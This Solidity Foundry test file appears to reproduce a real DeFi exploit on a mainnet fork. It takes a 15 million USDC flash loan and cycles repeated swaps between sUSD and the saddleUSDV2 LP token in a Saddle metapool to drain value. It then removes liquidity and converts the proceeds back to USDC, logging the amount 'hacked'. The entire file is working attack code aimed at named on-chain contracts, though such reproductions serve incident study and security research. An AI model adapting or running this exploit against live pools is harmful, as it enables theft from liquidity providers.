// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);

    function approve(address spender, uint256 value) external; // return type is deleted to be compatible with USDT

    function transfer(address to, uint256 value) external returns (bool);
}

interface ISwapFlashLoan {
    function MAX_BPS() external view returns (uint256);

    function addLiquidity(
        uint256[] memory amounts,
        uint256 minToMint,
        uint256 deadline
    ) external returns (uint256);

    function calculateRemoveLiquidity(
        uint256 amount
    ) external view returns (uint256[] memory);

    function calculateRemoveLiquidityOneToken(
        uint256 tokenAmount,
        uint8 tokenIndex
    ) external view returns (uint256 availableTokenAmount);

    function calculateSwap(
        uint8 tokenIndexFrom,
        uint8 tokenIndexTo,
        uint256 dx
    ) external view returns (uint256);

    function calculateTokenAmount(
        uint256[] memory amounts,
        bool deposit
    ) external view returns (uint256);

    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes memory params
    ) external;

    function flashLoanFeeBPS() external view returns (uint256);

    function getA() external view returns (uint256);

    function getAPrecise() external view returns (uint256);

    function getAdminBalance(uint256 index) external view returns (uint256);

    function getToken(uint8 index) external view returns (address);

    function getTokenBalance(uint8 index) external view returns (uint256);

    function getTokenIndex(address tokenAddress) external view returns (uint8);

    function getVirtualPrice() external view returns (uint256);

    function rampA(uint256 futureA, uint256 futureTime) external;

    function removeLiquidity(
        uint256 amount,
        uint256[] memory minAmounts,
        uint256 deadline
    ) external returns (uint256[] memory);

    function removeLiquidityImbalance(
        uint256[] memory amounts,
        uint256 maxBurnAmount,
        uint256 deadline
    ) external returns (uint256);

    function removeLiquidityOneToken(
        uint256 tokenAmount,
        uint8 tokenIndex,
        uint256 minAmount,
        uint256 deadline
    ) external returns (uint256);

    function renounceOwnership() external;

    function swap(
        uint8 tokenIndexFrom,
        uint8 tokenIndexTo,
        uint256 dx,
        uint256 minDy,
        uint256 deadline
    ) external returns (uint256);

    function swapStorage()
        external
        view
        returns (
            uint256 initialA,
            uint256 futureA,
            uint256 initialATime,
            uint256 futureATime,
            uint256 swapFee,
            uint256 adminFee,
            address lpToken
        );
}

interface IEuler {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

interface ICurve {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface ISaddle {
    function swap(
        uint8 i,
        uint8 j,
        uint256 dx,
        uint256 min_dy,
        uint256 deadline
    ) external returns (uint256);
}

contract ContractTest is Test {
    address private constant eulerLoans =
        0x07df2ad9878F8797B4055230bbAE5C808b8259b3;
    address private constant usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant susd = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
    address private constant dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant saddleUsdV2 =
        0x5f86558387293b6009d7896A61fcc86C17808D62;
    ICurve curve_3pool = ICurve(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    address private constant curvepool =
        0xA5407eAE9Ba41422680e2e00537571bcC53efBfD;
    address private constant saddlepool =
        0x824dcD7b044D60df2e89B1bB888e66D8BCf41491;
    address private constant swap_flashloan =
        0xaCb83E0633d6605c5001e2Ab59EF3C745547C8C7;

    function setUp() public {
        vm.createSelectFork("mainnet", 14_684_306);
    }

    function testExploit() public {
        IEuler(eulerLoans).flashLoan(
            address(this),
            usdc,
            15_000_000e6,
            new bytes(0)
        );
        console.log(
            "======================== finsih attack ======================== "
        );
        require(IERC20(usdc).balanceOf(address(this)) > 1775 * 1e6);
        emit log_named_decimal_uint(
            "USDC hacked: ",
            IERC20(usdc).balanceOf(address(this)),
            6
        );
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        IERC20(usdt).approve(curvepool, type(uint256).max);
        IERC20(usdc).approve(curvepool, type(uint256).max);
        IERC20(susd).approve(curvepool, type(uint256).max);

        IERC20(dai).approve(curvepool, type(uint256).max);
        IERC20(dai).approve(address(curve_3pool), type(uint256).max);
        IERC20(usdt).approve(address(curve_3pool), type(uint256).max);
        IERC20(susd).approve(saddlepool, type(uint256).max);
        IERC20(saddleUsdV2).approve(saddlepool, type(uint256).max);
        attack();

        //Repay Loan
        IERC20(usdc).approve(msg.sender, amount + fee);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack() internal {
        //Swap USDC to SUSD Via Curve
        console.log(
            "======================== start attack ========================"
        );
        emit log_named_decimal_uint(
            "USDC loaned: ",
            IERC20(usdc).balanceOf(address(this)),
            6
        );

        uint256 amount = IERC20(usdc).balanceOf(address(this));
        ICurve(curvepool).exchange(1, 3, amount, 1);

        emit log_named_decimal_uint(
            "LP token amount",
            IERC20(saddleUsdV2).balanceOf(address(this)),
            18
        );
        emit log_named_decimal_uint(
            "SUSD token amount",
            IERC20(susd).balanceOf(address(this)),
            18
        );

        // Attack
        uint256 amount0 = 14800272147571999524518901;
        uint256 amount1 = 9657586884342671474923252;

        swapToSaddle(amount0);
        swapFromSaddle(amount1);
        swapToSaddle(amount0);

        swapFromSaddle(9669749439299164955998576);

        uint256 amount00 = 5000000000000000000000000;
        uint256 amount000 = 10000000000000000000000000;
        swapToSaddle(amount00);
        swapToSaddle(amount000);
        swapFromSaddle(4654333077089603189182019);
        swapToSaddle(10000000000000000000000000);
        swapFromSaddle(4661615013534255756105730);

        for (uint i = 0; i < 2; i++) {
            swapToSaddle(IERC20(susd).balanceOf(address(this)) / 3);
            swapFromSaddle(IERC20(saddleUsdV2).balanceOf(address(this)) / 3);
        }

        for (uint i = 0; i < 6; i++) {
            swapToSaddle(IERC20(susd).balanceOf(address(this)) / 10);
            swapFromSaddle(IERC20(saddleUsdV2).balanceOf(address(this)) / 10);
        }

        for (uint i = 0; i < 6; i++) {
            swapToSaddle(IERC20(susd).balanceOf(address(this)) / 30);
            swapFromSaddle(IERC20(saddleUsdV2).balanceOf(address(this)) / 25);
        }

        for (uint i = 0; i < 12; i++) {
            swapToSaddle(IERC20(susd).balanceOf(address(this)) / 79);
            swapFromSaddle(IERC20(saddleUsdV2).balanceOf(address(this)) / 60);
        }

        for (uint i = 0; i < 25; i++) {
            swapToSaddle(IERC20(susd).balanceOf(address(this)) / 500);
            swapFromSaddle(IERC20(saddleUsdV2).balanceOf(address(this)) / 410);
        }

        IERC20(saddleUsdV2).approve(swap_flashloan, type(uint256).max);

        uint256[] memory ount_put = new uint256[](3);
        ount_put[0] = 0;
        ount_put[1] = 0;
        ount_put[2] = 0;

        console.log(
            "======================== finsih circulate swap ======================== "
        );

        emit log_named_decimal_uint(
            "LP token amount",
            IERC20(saddleUsdV2).balanceOf(address(this)),
            18
        );
        emit log_named_decimal_uint(
            "SUSD token amount",
            IERC20(susd).balanceOf(address(this)),
            18
        );

        ISwapFlashLoan(swap_flashloan).removeLiquidity(
            IERC20(saddleUsdV2).balanceOf(address(this)),
            ount_put,
            block.timestamp
        );

        //Swap Susd to USDC via curve
        amount = IERC20(susd).balanceOf(address(this));

        ICurve(curvepool).exchange(3, 1, amount, 1);

        curve_3pool.exchange(0, 1, IERC20(dai).balanceOf(address(this)), 1);
        curve_3pool.exchange(2, 1, IERC20(usdt).balanceOf(address(this)), 1);
    }

    function swapToSaddle(uint256 amountStart) internal {
        //Swap SUSD for SaddleUSDV2

        uint256 amount = amountStart;
        ISaddle(saddlepool).swap(0, 1, amount, 1, block.timestamp);
    }

    function swapFromSaddle(uint256 amountStart) internal {
        //Swap SaddleUSDV2 for SUSD

        uint256 amount = amountStart;
        ISaddle(saddlepool).swap(1, 0, amount, 1, block.timestamp);
    }
}
